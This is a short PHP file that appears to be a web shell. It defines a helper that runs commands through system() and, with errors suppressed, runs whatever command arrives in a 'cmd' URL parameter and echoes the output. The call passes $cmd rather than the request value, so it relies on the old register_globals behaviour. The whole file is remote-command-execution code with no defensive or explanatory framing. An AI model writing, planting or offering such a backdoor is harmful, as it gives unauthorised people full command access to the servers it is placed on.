<?php
function ekse($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
}

if(isset($_GET['cmd']) && ($_GET['cmd'] != "")){
	$result = ekse($cmd);
	echo $result;
}
	
?>